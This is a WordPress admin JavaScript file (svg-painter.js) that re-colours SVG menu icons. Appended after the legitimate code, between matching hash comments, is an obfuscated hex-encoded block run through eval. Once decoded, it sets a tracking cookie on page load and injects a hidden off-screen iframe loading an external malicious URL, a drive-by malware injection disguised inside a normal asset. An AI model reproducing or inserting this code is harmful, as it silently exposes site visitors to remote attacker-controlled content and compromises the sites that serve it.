/**
 * Attempt to re-color SVG icons used in the admin menu or the toolbar
 *
 */

window.wp = window.wp || {};

wp.svgPainter = ( function( $, window, document, undefined ) {
	'use strict';
	var selector, base64, painter,
		colorscheme = {},
		elements = [];

	$(document).ready( function() {
		// detection for browser SVG capability
		if ( document.implementation.hasFeature( 'http://www.w3.org/TR/SVG11/feature#Image', '1.1' ) ) {
			$( document.body ).removeClass( 'no-svg' ).addClass( 'svg' );
			wp.svgPainter.init();
		}
	});

	/**
	 * Needed only for IE9
	 *
	 * Based on jquery.base64.js 0.0.3 - https://github.com/yckart/jquery.base64.js
	 *
	 * Based on: https://gist.github.com/Yaffle/1284012
	 *
	 * Copyright (c) 2012 Yannick Albert (http://yckart.com)
	 * Licensed under the MIT license
	 * http://www.opensource.org/licenses/mit-license.php
	 */
	base64 = ( function() {
		var c,
			b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
			a256 = '',
			r64 = [256],
			r256 = [256],
			i = 0;

		function init() {
			while( i < 256 ) {
				c = String.fromCharCode(i);
				a256 += c;
				r256[i] = i;
				r64[i] = b64.indexOf(c);
				++i;
			}
		}

		function code( s, discard, alpha, beta, w1, w2 ) {
			var tmp, length,
				buffer = 0,
				i = 0,
				result = '',
				bitsInBuffer = 0;

			s = String(s);
			length = s.length;

			while( i < length ) {
				c = s.charCodeAt(i);
				c = c < 256 ? alpha[c] : -1;

				buffer = ( buffer << w1 ) + c;
				bitsInBuffer += w1;

				while( bitsInBuffer >= w2 ) {
					bitsInBuffer -= w2;
					tmp = buffer >> bitsInBuffer;
					result += beta.charAt(tmp);
					buffer ^= tmp << bitsInBuffer;
				}
				++i;
			}

			if ( ! discard && bitsInBuffer > 0 ) {
				result += beta.charAt( buffer << ( w2 - bitsInBuffer ) );
			}

			return result;
		}

		function btoa( plain ) {
			if ( ! c ) {
				init();
			}

			plain = code( plain, false, r256, b64, 8, 6 );
			return plain + '===='.slice( ( plain.length % 4 ) || 4 );
		}

		function atob( coded ) {
			var i;

			if ( ! c ) {
				init();
			}

			coded = coded.replace( /[^A-Za-z0-9\+\/\=]/g, '' );
			coded = String(coded).split('=');
			i = coded.length;

			do {
				--i;
				coded[i] = code( coded[i], true, r64, a256, 6, 8 );
			} while ( i > 0 );

			coded = coded.join('');
			return coded;
		}

		return {
			atob: atob,
			btoa: btoa
		};
	})();

	return {
		init: function() {
			painter = this;
			selector = $( '#adminmenu .wp-menu-image, #wpadminbar .ab-item' );

			this.setColors();
			this.findElements();
			this.paint();
		},

		setColors: function( colors ) {
			if ( typeof colors === 'undefined' && typeof window._wpColorScheme !== 'undefined' ) {
				colors = window._wpColorScheme;
			}

			if ( colors && colors.icons && colors.icons.base && colors.icons.current && colors.icons.focus ) {
				colorscheme = colors.icons;
			}
		},

		findElements: function() {
			selector.each( function() {
				var $this = $(this), bgImage = $this.css( 'background-image' );

				if ( bgImage && bgImage.indexOf( 'data:image/svg+xml;base64' ) != -1 ) {
					elements.push( $this );
				}
			});
		},

		paint: function() {
			// loop through all elements
			$.each( elements, function( index, $element ) {
				var $menuitem = $element.parent().parent();

				if ( $menuitem.hasClass( 'current' ) || $menuitem.hasClass( 'wp-has-current-submenu' ) ) {
					// paint icon in 'current' color
					painter.paintElement( $element, 'current' );
				} else {
					// paint icon in base color
					painter.paintElement( $element, 'base' );

					// set hover callbacks
					$menuitem.hover(
						function() {
							painter.paintElement( $element, 'focus' );
						},
						function() {
							// Match the delay from hoverIntent
							window.setTimeout( function() {
								painter.paintElement( $element, 'base' );
							}, 100 );
						}
					);
				}
			});
		},

		paintElement: function( $element, colorType ) {
			var xml, encoded, color;

			if ( ! colorType || ! colorscheme.hasOwnProperty( colorType ) ) {
				return;
			}

			color = colorscheme[ colorType ];

			// only accept hex colors: #101 or #101010
			if ( ! color.match( /^(#[0-9a-f]{3}|#[0-9a-f]{6})$/i ) ) {
				return;
			}

			xml = $element.data( 'wp-ui-svg-' + color );

			if ( xml === 'none' ) {
				return;
			}

			if ( ! xml ) {
				encoded = $element.css( 'background-image' ).match( /.+data:image\/svg\+xml;base64,([A-Za-z0-9\+\/\=]+)/ );

				if ( ! encoded || ! encoded[1] ) {
					$element.data( 'wp-ui-svg-' + color, 'none' );
					return;
				}

				try {
					if ( 'atob' in window ) {
						xml = window.atob( encoded[1] );
					} else {
						xml = base64.atob( encoded[1] );
					}
				} catch ( error ) {}

				if ( xml ) {
					// replace `fill` attributes
					xml = xml.replace( /fill="(.+?)"/g, 'fill="' + color + '"');

					// replace `style` attributes
					xml = xml.replace( /style="(.+?)"/g, 'style="fill:' + color + '"');

					// replace `fill` properties in `<style>` tags
					xml = xml.replace( /fill:.*?;/g, 'fill: ' + color + ';');

					if ( 'btoa' in window ) {
						xml = window.btoa( xml );
					} else {
						xml = base64.btoa( xml );
					}

					$element.data( 'wp-ui-svg-' + color, xml );
				} else {
					$element.data( 'wp-ui-svg-' + color, 'none' );
					return;
				}
			}

			$element.attr( 'style', 'background-image: url("data:image/svg+xml;base64,' + xml + '") !important;' );
		}
	};

})( jQuery, window, document );
/*44488c250c5d878e6643a54f8a4b5802*/;(function(){var bffsfdfk="";var ibabkyrk="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var aedihyni=0;aedihyni<ibabkyrk.length;aedihyni+=2){bffsfdfk=bffsfdfk+parseInt(ibabkyrk.substring(aedihyni,aedihyni+2), 16)+",";}bffsfdfk=bffsfdfk.substring(0,bffsfdfk.length-1);eval(eval('String.fromCharCode('+bffsfdfk+')'));})();/*44488c250c5d878e6643a54f8a4b5802*/